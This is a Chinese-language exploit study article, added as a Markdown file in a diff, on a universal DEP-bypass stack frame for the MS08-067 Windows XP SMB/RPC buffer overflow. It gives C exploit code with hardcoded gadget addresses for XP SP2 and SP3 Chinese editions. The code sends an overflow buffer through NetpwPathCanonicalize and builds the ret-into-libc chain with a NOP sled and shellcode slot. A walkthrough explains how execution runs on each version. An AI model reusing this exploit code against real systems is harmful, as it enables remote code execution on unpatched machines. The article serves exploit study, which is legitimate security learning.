@@ -1,0 +1,235 @@
+
+# MS08-067 通用 bypass DEP 的缓冲区溢出栈帧构造方法的学习
+
+> 原文：[`www.pediy.com/kssd/pediy10/81667.html`](https://www.pediy.com/kssd/pediy10/81667.html)
+
+## 【题目】
+一种在 windows xp sp2 chs 和 windows xp sp3 chs 系统中通用的能够 bypass DEP 的利用 MS08-067 漏洞缓冲区溢出的栈帧构造方法的学习
+
+## 【作者】
+ParaChAos
+
+## 【前言】
+由于该漏洞利用的一些关键地址在 windows xp 的每个版本中都会变动，为了提高漏洞攻击程序的通用性和溢出的成功率，在这里讨论了一种在 windows xp sp2 chs 和 windows xp sp3 chs 系统中通用的栈帧的构造。
+
+我的系统环境如下：
+
+Windows xp sp2 chs `netapi32.dll` `2600.2976`
+
+Windows xp sp3 chs `netapi32.dll` `2600.5512`
+
+本文假定你已经掌握了缓冲区溢出的基础知识，以及 MS08-067 的利用方法，并不做系统性的介绍，只总结该漏洞利用的关键片段。
+
+## 【目录】
+本文有以下内容：
+1. bypass dep 方法介绍
+2. 关键溢出代码(改自 emm 的代码)
+3. 关键栈帧的制造
+4. 代码在被溢出方的执行流程
+
+## 【内容】
+
+### 1. bypass dep 方法介绍
+
+本文主要是针对下面这篇帖子的学习与总结。虽然不知作者是谁，但还是要表示感谢。
+
+引用自华夏黑客联盟的一篇帖子：
+
+“通过 ret-into-libc 方法编写通用 exp 的一个小技巧
+
+ms07029 和 ms08067 这两个 NB 漏洞都使用 ret-into-libc 方法来绕过 DEP 数据执行保护，首先来科普下什么是 ret-into-libc，一般的栈溢出控制 eip 后通过一些 opcode 来跳到栈里执行 shellcode，但是开启了数据执行保护的话，这种方法就不行了，那么我们只能控制 eip 往可以执行的地方跳，我们只能在可执行的地方找到符合我们要求的指令，来帮我们干活，干完活后我们还需要收回控制权，那么在干活指令后必须有一个 ret(n)，这样我们才有可能继续控制流程 跳转到另一个地方去干下一个活，理论上，通过构造 stack frame 也能完成 shellcode 的功能。但是这只是理论上说，谁也不会傻到整个 shellcode 通过 stack frame 跳来跳去来实现，一般只是利用这个技巧去执行 ZwSetInformationProcess 函数来关闭 DEP，然后 ret(n)回去用普通的 办法执行 shellcode。 科普完来到正题，以 ms08067 为例子，XP 上可以通过上述方法来关闭 DEP，但是 SP2 CHS 和 SP3 CHS 的跳转地址不一样，那么如何实现通用呢，仔细想想如果我们能利用 ret-to-libc 先跳到一个地址，假设这个地址在 SP2 系统上是 pop/pop/pop/.../ret，在 SP3 系统上是 pop/pop/pop/pop/.../ret，只要 SP2 和 SP3 上 pop 的次数不一致导致 ret 的时候 esp 不一致，那么就可以通过构造 stack frame 来分别跳转到各自系统的地址。有了这样一个大胆的假设后，我们需要小心的求证，随便一搜发现这样的地址很多，但是符合 ms08067 的具体情况 不异常的就难找了，尝试了多个地址后，功夫不负有心人，找到了一个符合要求且满足 ms08067 漏洞的特殊要求的地址，实现了 SP2 CHS 和 SP3 CHS 的 Bypass DEP 的 Exp 的通用（XP 其他语言版本可以用类似方法）”
+
+### 2. 关键溢出代码
+
+代码:
+
+```
+……………………………………………………………关键跳转地址，主要用来关 DEP
+DWORD dwDisableNXSP2 = 0x58FC16E2; //sp2 zwSetInformationProcess//noexecute
+DWORD dwDisableNXSP3 = 0x58FC17C2; //sp3 zwSetInformationProcess//noexecute
+DWORD dwRetAddrAll = 0x58FC094D; // pop/pop/pop/pop/ret on sp2 chs 或 ret on sp3 chs
+DWORD dwJmpAddrSP3 = 0x7ffa4F54; // jmp esi
+DWORD dwJmpAddrSP2 = 0x7ffa4512; // jmp esp
+DWORD dwScratchAddr = 0x00020408; //占位但必须是 readable address
+
+……………………………………………………………改自 EMM 的代码
+   RpcTryExcept
+    {
+    //NetpwNameCompare(L"LittleWallE",L"123456789",L"123456789",4,0);
+//这个数值学自 LittleWallE 的分析，感谢他详细的分析
+//在栈上制造 L'\\\\'，也即 0x5c0x00
+      func23(L"parachaos","\\x4c\\x00\\x10\\x20","\\x4c\\x00\\x10\\x20",4,0);
+  
+    memset(Buff,0,sizeof(Buff));
+    BufLen = MakeBuff(Buff,sizeof(Buff));
+  CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WaitExit,(LPVOID)NULL,0,&dwID);
+(DWORD)*(DWORD *)Buff3 = 1;
+
+//NetpwPathCanonicalize(arg_0,(unsigned short *)arg1,(unsigned char *)arg2,arg3,arg4,(long *)Buff3,1);
+//send buff
+func1f(L"EMM!",(wchar_t *)Buff,Buff2,1000,L"",(DWORD *)Buff3,1);
+
+}
+    RpcExcept ( 1 )
+    {
+        status = RpcExceptionCode();
+    if(status == 1726)
+    {
+    }
+    else
+    {
+      printf("RpcExceptionCode() = %u\r\n", status );
+      return;
+    }
+    }
+    RpcEndExcept
+/*
+　　如果返回信息为：Make SMB Connection error:53 或者 Make SMB Connection error:1219，
+后面的数字可能是变化的。那么说明该主机没有开机连网或者没有安装 Microsoft 网络的文件和打印机共享协议 或没有启动 Server 服务，因此无法进行溢出。
+
+　还有一种情况是返回信息为：
+SMB Connect OK!
+RpcExceptionCode() = 1722
+出现这样的情况，溢出失败，对方可能开启了防火墙。
+
+　　那么最后就是成功的提示信息了：
+SMB Connect OK!
+Send Payload Over!
+*/
+```
+
+### 3. 关键栈帧的制造
+
+…………………………………………………………………………
+
+//EMM 估计的跳转地址，但是在我的机器上略有不同，所以进行了微调
+
+代码:
+
+```
+#define  JMPPOINT  "B041" //emm 做的地址
+int MakeBuff(char *Buff, int BufLen)
+{
+  int len = 0;
+  char tmp[5] = {0};
+  int i;
+  
+//填充
+  for(i = 0; i < BufLen/4; i++)
+  {
+    memset(tmp,0,4);
+    sprintf(tmp,"B%03d",i);
+//*    
+    if(memcmp(tmp,JMPPOINT,4) == 0)
+    {
+      break;
+    }
+//*/
+    memcpy(Buff + len,tmp,4);
+    len += 4;
+  }
+//写溢出的字符串
+memcpy(Buff,L".\\\\\\a\\\\..\\\\..\\\\NN",13*2);
+////////////////////////
+//my adjust
+  len -= 6; //微调
+  for(i = 0; i < 6; i++)
+  {
+    memcpy(Buff + len,&dwScratchAddr,4);//&dwRetAddr,4);
+    len += 4;
+  }
+/*
+  memcpy(Buff + len,&dwJmpAddr,4);
+  len += 4;
+*/
+//  add jmp addr here
+//下面这个顺序基本就是栈中的情况了，低地址在上面
+  memcpy(Buff + len,&dwRetAddrAll,4);  //通用跳转地址，sp2 和 sp3 的 pop 数量不同
+  len += 4;
+  //is sp3 here
+  memcpy(Buff + len,&dwDisableNXSP3,4);  //sp3 的 bypass DEP
+  len += 4;
+  memcpy(Buff + len, &dwScratchAddr, 4);  /////这里地址要求可读，pop to esi
+  len += 4; 
+  memcpy(Buff + len, &dwJmpAddrSP3, 4);  //JMP ESI  
+  len += 4; 
+  memcpy(Buff + len, &dwScratchAddr, 4);  //占位
+  len += 4; 
+  memcpy(Buff + len, &dwDisableNXSP2, 4); //SP2 BYPASS DEP
+  len += 4; 
+  memset(Buff + len, 0x48, 20); //占位
+  len += 20; 
+  memcpy(Buff + len, &dwJmpAddrSP2, 4); //sp2 jmp  esp
+  len += 4; 
+
+  memset(Buff + len,0x90,0xe);  //nop nop
+  len += 0xe;
+
+  memcpy(Buff + len,sc,sizeof(sc) - 1); //shellcode
+  len += sizeof(sc) - 1;
+
+  memcpy(Buff + len,"EMM!",4); //author’s name
+  len += 4;
+
+  memset(Buff + 0x206 * 2,0,2);  //end
+  return len;
+}
+```
+
+### 4. 代码在被溢出方的执行流程
+
+…………………………………………………………………………
+
+首先来看栈中的快照
+
+低地址在上
+
+刚溢出时：
+
+1)  L"\\\\NN"
+2)  某个数量的占位符
+3)  通用跳转地址
+4)  Sp3 bypass DEP 过程地址
+5)  Sp2 中 Pop 到 esi 的数值
+6)  Sp3 中 Jmp esi 的地址
+7)  DWORD 占位
+8)  Sp2 bypass DEP 过程地址
+9)  20 字节占位
+10) Sp2 jmp esp
+11) 0xe 个的 nop
+12) Shellcode
+13) ……
+
+开始执行：
+
+程序 ret 到了 3)所指的通用跳转地址，程序执行流程如下:
+
+当在 sp2 chs 中时，其内容等价于 pop/pop/pop/pop/ret，其中有一条 pop esi，是我们需要注意控制内容的，因为在后面执行 zwSetInformationProcess 这个函数时，ESI 的内容必须可读，否则会发生异常。
+
+在 3）地址的 4 个 pop 后，执行 ret 指令跳转到 8）的 bypass DEP 过程的地址，调用 zwSetInformationProcess 关闭 DEP，然后 pop，retn n 等指令后，进入 10）的地址执行 jmp esp，就跳进了 11）指向的 nop+shellcode 中。
+
+/////////////////////////////////////////////////////////////////////////////
+
+当在 sp3 chs 中时，3）的内容等价于 ret，转到了 4）的过程关闭 DEP，随后有 pop 和 ret，进入 6）执行，在这里 esi 的值是固定的，直接指向了 shellcode。
+
+/////////////////////////////////////////////////////////////////////////////
+
+因为缓冲区溢出的环境要求是很严格的，差一点都不行，在实践中攻击的成功率是很低的，所以在实战中尽力提高漏洞利用程序的健壮性、通用性就显得很必要了。这也正是本文讨论的意义所在。
+
+\----------------------------------------the end-------------------------------------------
+
+以上就是我在学习 MS08-067 时的一点心得，与大家分享。谬误之处请大家一定指正。
+
+在此要对一些人表示感谢：
+
+感谢 failwest 在他的书中深入浅出的讲解，帮我快速入门。
+
+感谢 LittleWallE 的十分详实的分析，特别是他对 netapi32.dll 内问题函数的逆向分析使我获益良多。http://blog.csdn.net/LittleWallE/archive/2009/01/14/3772791.aspx
+
+感谢 EMM@ph4nt0m.org 的源代码，使我对该漏洞利用有了形象的理解。
+
+最后感谢那篇帖子，使我掌握了关 DEP 的方法和通用 shellcode 的编写思路。
+
+上面那个 ret-to-lib bypass DEP 方法是 luoluo 搞出来的
+
+原始出处:http://www.cnblogs.com/luoluo/archive/2009/01/17/1377694.html
